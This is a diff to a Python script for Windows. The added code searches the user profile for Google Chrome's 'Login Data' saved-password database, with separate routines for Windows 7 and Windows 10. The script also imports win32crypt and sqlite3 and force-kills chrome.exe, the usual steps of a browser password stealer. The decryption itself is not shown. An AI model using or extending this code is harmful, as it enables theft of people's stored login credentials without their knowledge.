@@ -5,6 +5,29 @@ import sqlite3
 import win32crypt
 import sys
 from platform import platform
+import getpass
+import glob
+
+
+def find_Login_Data_win7():
+    try:
+        path = sys.argv[1]
+    except IndexError:
+        for w in os.walk(os.getenv('USERPROFILE')):
+            if 'Chrome' in w[1]:
+                path = str(w[0]) + '\Chrome\User Data\Default\Login Data'
+    return path
+
+
+def find_Login_Data_win10(): 
+    dir = 'C:\Documents and Settings\\' + getpass.getuser() 
+    for root, dirs, files in os.walk(dir):
+        for name in files:
+            if name == 'Login Data':
+                path = os.path.join(root, name) 
+                return path
+    
+
 
 #get system type
 platform_type = platform()
@@ -15,12 +38,15 @@ is_Win_10 = True
 if platform_type.find('Windows-10') == -1:
     is_Win_10 = False
 
-#gen way to file("Login Data" data base)
-if is_Win_10: 
-    path = os.path.expandvars('C:\\Documents and Settings\\%USERNAME%\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default\\Login Data')
-else:
-    path = os.path.expandvars('C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data')
 
+#gen way to file("Login Data" data base)
+if is_Win_10 == True: 
+    path = find_Login_Data_win10()
+    
+else:
+    path = find_Login_Data_win7()
+
+#path = path.decode('cp1251').encode('ascii', 'ignore')
 #close the Chrome
 os.system('taskkill /f /im '+ 'chrome.exe')
 
